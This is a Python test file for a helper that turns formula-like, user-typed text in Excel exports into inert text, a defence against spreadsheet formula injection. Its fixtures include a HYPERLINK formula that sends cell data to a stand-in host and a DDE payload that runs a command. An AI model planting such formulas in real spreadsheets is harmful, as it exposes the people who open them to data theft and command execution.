"""force_text_cells: shopper-typed text that looks like a formula is saved as inert text. No network."""
from __future__ import annotations

import io
import zipfile

import openpyxl
import pandas as pd

from core.excel_text import force_text_cells

FORMULA_TERM = '=HYPERLINK("http://example.invalid/?d="&B2,"click")'


def _saved(workbook: openpyxl.Workbook) -> bytes:
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


def _sheet_xml(file_bytes: bytes) -> str:
    return zipfile.ZipFile(io.BytesIO(file_bytes)).read("xl/worksheets/sheet1.xml").decode("utf-8")


def test_formula_typed_cells_become_text_with_the_exact_value():
    workbook = openpyxl.Workbook()
    sheet = workbook.active
    sheet["A1"] = FORMULA_TERM
    sheet["A2"] = "=1+1"
    sheet["B1"] = "sleeping bag"
    sheet["B2"] = 42
    assert (sheet["A1"].data_type, sheet["A2"].data_type) == ("f", "f")

    changed = force_text_cells(workbook)
    file_bytes = _saved(workbook)

    assert changed == 2
    reopened = openpyxl.load_workbook(io.BytesIO(file_bytes)).active
    assert (reopened["A1"].data_type, reopened["A1"].value) == ("s", FORMULA_TERM)
    assert (reopened["A2"].data_type, reopened["A2"].value) == ("s", "=1+1")
    assert (reopened["B1"].value, reopened["B2"].value) == ("sleeping bag", 42)
    assert "<f>" not in _sheet_xml(file_bytes)


def test_a_workbook_without_formulas_is_left_as_is():
    workbook = openpyxl.Workbook()
    workbook.active["A1"] = "jabon neutro"
    workbook.create_sheet("Otra")["C3"] = 3.5

    assert force_text_cells(workbook) == 0
    assert workbook.active["A1"].data_type == "s"


def test_pandas_excel_writer_output_has_no_formula_cells_after_forcing_text():
    buffer = io.BytesIO()
    with pd.ExcelWriter(buffer, engine="openpyxl") as writer:
        pd.DataFrame({"Search Term": [FORMULA_TERM, "-2+3", "@SUM(A1)"]}).to_excel(writer, sheet_name="S", index=False)
        pd.DataFrame({"Campaign": ["=cmd|' /C calc'!A0"]}).to_excel(writer, sheet_name="T", index=False)
        changed = force_text_cells(writer.book)

    workbook = openpyxl.load_workbook(io.BytesIO(buffer.getvalue()))
    cells = [cell for sheet in workbook.worksheets for row in sheet.iter_rows() for cell in row]
    assert changed == 2
    assert not [cell.coordinate for cell in cells if cell.data_type == "f"]
    assert workbook["S"]["A2"].value == FORMULA_TERM
    assert workbook["T"]["A2"].value == "=cmd|' /C calc'!A0"
